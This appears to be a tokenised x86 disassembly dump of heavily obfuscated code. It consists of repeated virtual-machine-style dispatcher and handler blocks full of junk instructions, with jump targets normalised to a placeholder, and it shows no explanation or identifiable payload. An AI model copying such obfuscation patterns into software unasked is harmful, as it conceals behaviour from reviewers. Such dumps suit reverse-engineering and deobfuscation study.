pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512039
pushfd
jmp rwxdata
push [ esp + 0xc ]
pop [ ebp ]
pushad
lea esp [ esp + 0x30 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_51203f
call sub_512f6f
bt si si
cmp dh ch
std
popfd
pushfd
push ecx
lea esp [ esp + 0x8 ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512072
mov [ esp + 0x28 ] ecx
pushfd
pushfd
pushfd
mov [ esp + 0x30 ] edx
jmp rwxdata
mov [ esp + 0x4 ] bh
push [ esp + 0xc ]
push [ esp + 0x8 ]
pushfd
pop [ esp + 0x34 ]
jmp rwxdata
pushfd
mov [ esp + 0x34 ] ebx
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x30 ]
jmp rwxdata
pushfd
pushfd
pushfd
mov [ esp + 0x38 ] 0x0
pushfd
mov [ esp ] ebp
pushfd
lea esp [ esp + 0x40 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_51209a
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] dh
pushfd
pushfd
pop [ esp + 0x18 ]
push [ esp + 0x4 ]
jmp rwxdata
pushad
push ebx
mov [ esp + 0x3c ] ebx
mov [ esp ] 0x9b86
jmp rwxdata
pushfd
push [ rwxdata ]
pop [ esp + 0x3c ]
push 0xb8d58b8b
mov [ esp + 0x3c ] 0x0
pushfd
push [ esp ]
lea esp [ esp + 0x44 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5120b2
not ebp
mov [ esp + 0x20 ] ecx
movzx si cl
pop esi
mov [ esp + 0x18 ] edx
mov si dx
movsx bp dl
pushfd
pop [ esp + 0x14 ]
dec bp
xchg [ esp + 0x10 ] ebx
sar esi 0x14
clc
btc di si
movsx di dl
push [ rwxdata ]
pop [ esp + 0xc ]
rcl si 0x7
and si cx
adc esi esi
mov [ esp + 0x8 ] 0x0
add esp 0x8
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512161
pushfd
push [ rwxdata ]
pop [ esp + 0x38 ]
pushfd
mov [ esp + 0x38 ] 0x0
pushfd
mov [ esp ] 0x0
push [ esp ]
mov [ esp + 0x4 ] 0x75
lea esp [ esp + 0x40 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5121ac
pushfd
[ edi ] [ esi ]
std
mov edi [ esp + 0x4c ]
bt bx di
btr esi ebx
movsx si dl
mov esi [ esp + 0x50 ]
mov [ esp + 0x4 ] 0x61
call sub_51341b
jmp rwxdata
mov [ esp + 0x28 ] eax
mov [ esp ] al
mov [ esp + 0x4 ] 0xf770b11
mov [ esp + 0x4 ] 0x5372
mov [ esp + 0x4 ] esp
mov [ esp + 0x24 ] esi
push 0x845fd6cb
mov [ esp + 0x4 ] eax
jmp rwxdata
mov [ esp ] 0xb3
mov [ esp + 0x24 ] edi
call sub_51219e
sub_5121d7
add ebp 0x6
mov [ esp ] bh
mov [ esp ] 0x83
call sub_511b3e
push edx
shl al cl
lea esp [ esp + 0x4c ]
jle rwxdata
pushad
pushad
call sub_513a2b
mov [ esp + 0x30 ] edx
call sub_511ee6
mov [ ebp + 0x4 ] ax
jge rwxdata
push 0x9ebc3425
call sub_511f91
cmp ebx 0xfe0
pushad
push 0x408d4e44
mov [ esp + 0x4 ] 0x1c
lea esp [ esp + 0x30 ]
jne rwxdata
push ecx
pushfd
pop [ esp ]
push 0x7f1662e9
push [ esp + 0x4 ]
pop [ ebp ]
mov [ esp ] 0x57
push 0xfd9f00cf
lea esp [ esp + 0xc ]
jmp rwxdata
pushad
lea ebx [ eax + 0x6a190e72 ]
mov ebx [ esp + 0x20 ]
pushad
lea esp [ esp + 0x44 ]
jmp rwxdata
bts bx 0xf
shl bl 0x3
neg bx
xor [ ebp + 0xc ] 0x20
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
setge bh
pop ebx
pushfd
mov [ esp ] esi
lea esp [ esp + 0x4 ]
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512220
push 0x903f3ecc
mov [ esp + 0xc ] 0xaf
pushfd
push [ rwxdata ]
pop [ esp + 0x2c ]
call j_sub_513fcc
shl al cl
xor al 0x36
shl dx 0xd
ror dx cl
movzx eax [ esi - 0x1 ]
pushfd
btc dx sp
ror dx 0x9
xor al bl
neg edx
rcl dl 0x1
ror dl 0x5
neg al
mov [ esp ] 0xd2b5
seta dh
call sub_514103
push ecx
push 0x7c138578
jmp rwxdata
jmp rwxdata
mov [ ebp ] ax
push eax
mov [ esp + 0x4 ] 0xf7
mov [ esp + 0x4 ] 0xb
pushfd
lea esp [ esp + 0x10 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512280
push [ rwxdata ]
pop [ esp + 0x40 ]
mov [ esp + 0x10 ] bh
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x8 ] ax
mov [ esp ] bh
lea esp [ esp + 0x3c ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5123f5
pushfd
mov [ esp + 0x28 ] ecx
mov [ esp ] 0xa9
jmp rwxdata
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp + 0x28 ] ebp
pushfd
push 0xa6feee80
mov [ esp + 0x2c ] eax
jmp rwxdata
mov [ esp + 0x28 ] esi
call sub_51203f
mov [ esp ] 0xd1
push 0xc7af53ff
jmp rwxdata
mov [ esp + 0x20 ] edx
pushad
call sub_5116b8
sub_512427
pushfd
mov [ esp ] ecx
pushad
pushfd
push [ esp ]
mov [ esp + 0x24 ] ebp
mov [ esp + 0x4 ] sp
mov [ esp + 0x20 ] eax
pushfd
mov [ esp + 0x4 ] si
mov [ esp + 0x20 ] esi
push [ esp ]
jmp rwxdata
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_51246a
call sub_51326a
cmp bx ax
xor eax 0x46c05fa
bt di sp
neg eax
clc
not eax
cmp si cx
cmp dh 0xbe
stc
pushfd
xor ebx eax
mov [ esp ] esp
stc
clc
sub ebp 0x4
jmp rwxdata
pushfd
mov [ ebp ] eax
pushfd
mov [ esp + 0x1c ] esp
lea esp [ esp + 0x24 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_5124fc
bts dx 0x7
sub dl dl
neg dl
xor al 0xb
mov dh dl
rol dh cl
sar edx 0x1b
pushfd
xor bl al
neg dl
ror edx cl
add dx ax
mov edx [ ebp ]
clc
cmp dh dl
bt ax 0xf
add ebp 0x4
push esi
mov [ eax + edi ] edx
mov [ esp + 0xc ] dh
pushfd
pushfd
lea esp [ esp + 0x3c ]
jmp rwxdata
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512539
mov [ esp ] 0x73
lea esp [ esp + 0x24 ]
jle rwxdata
pushfd
pushfd
jmp rwxdata
push ebp
call sub_513d7f
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
mov [ esp + 0x4 ] 0x71
mov [ esp + 0x4 ] ebp
call sub_5133c2
setge bh
pop ebx
pushfd
mov [ esp ] esi
lea esp [ esp + 0x4 ]
jmp rwxdata
jmp rwxdata
pushfd
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
pushfd
pushfd
pop [ esp ]
pushfd
push [ esp + 0x4 ]
pop [ ebp ]
pushfd
lea esp [ esp + 0xc ]
jmp rwxdata
call sub_512e95
dec al
mov ax [ ebp ]
or cl 0x94
push 0x628fc87b
bt esi ebx
mov cl [ ebp + 0x2 ]
pushfd
sub ebp 0x2
mov [ esp ] 0xc9
pushfd
call sub_5114ae
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512a50
pushad
mov [ esp + 0x4 ] dh
mov [ ebp ] ax
pushfd
mov [ esp ] edi
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
pop ecx
pop ecx
mov ch ch
bt cx 0x3
ror al 0x4
sete cl
sub bl al
shl ch 0x1
movzx eax al
shrd cx di cl
movzx cx al
mov ecx [ eax * 4 + rwxdata ]
push [ esp ]
pushad
not ecx
stc
test cx si
pushfd
add esi 0xffffffff
cmp al dh
pushfd
stc
add ecx 0x0
pushfd
mov [ esp + 0x30 ] ecx
mov [ esp ] edi
push [ esp + 0x30 ]
retn 0x34
sub_512a67
push 0xd33f054
pushad
mov [ esp + 0x28 ] edi
push [ esp ]
jmp rwxdata
push 0x49081d2b
mov [ esp + 0x2c ] ecx
pushfd
pushfd
mov [ esp + 0x30 ] edx
mov [ esp ] 0xf9
pushfd
pushfd
pop [ esp + 0x30 ]
call sub_513704
mov [ ebp ] ax
pushfd
push [ esp + 0x8 ]
pushfd
push eax
lea esp [ esp + 0x34 ]
jmp rwxdata
movsx ax cl
cmc
btc ax 0x5
or ax si
lea eax [ edi + 0x50 ]
jmp rwxdata
test dh 0xb2
call sub_511a42
mov [ esp ] 0xee52f1b0
mov [ esp + 0x20 ] edi
push 0xdca92d94
mov [ esp + 0x20 ] ecx
jmp rwxdata
jmp rwxdata
mov [ esp + 0x1c ] edx
mov [ esp ] 0x2aae
jmp rwxdata
push [ esp + 0x8 ]
mov [ esp ] 0xa4
pushfd
pop [ esp + 0x1c ]
mov [ esp + 0x4 ] 0x7927
mov [ esp + 0x18 ] ebx
pushfd
pushfd
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x1c ]
pushfd
pushfd
mov [ esp + 0x20 ] 0x0
pushfd
pushad
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
ror esi cl
cmc
mov esi [ esp + 0x30 ]
shl bp 0x1
bswap esi
ror al 0x7
xchg bp di
shl di cl
add esi 0x9dcffc04
bt bp 0x9
cmc
pushfd
rol esi 0x10
rcr bp 0xf
xor bx 0x16e4
lea ebp [ esp + 0x4 ]
dec bl
or di bp
sub esp 0xbc
inc bl
mov edi esp
xadd ch bl
xadd bl al
stc
adc bl 0xcc
mov ebx esi
btr ecx eax
pushad
jmp rwxdata
neg cx
add esi [ ebp ]
sub esp 0xffffffe0
shl cx 0xd
cmp cl 0x8f
ror ecx 0x1a
xadd ch al
mov al [ esi - 0x1 ]
add cx 0x1c13
shrd cx dx 0xa
sub al bl
dec ch
bt si 0xd
pushfd
neg al
lea ecx [ ebp - 0x5480b32b ]
push ecx
push [ esp ]
not ch
inc al
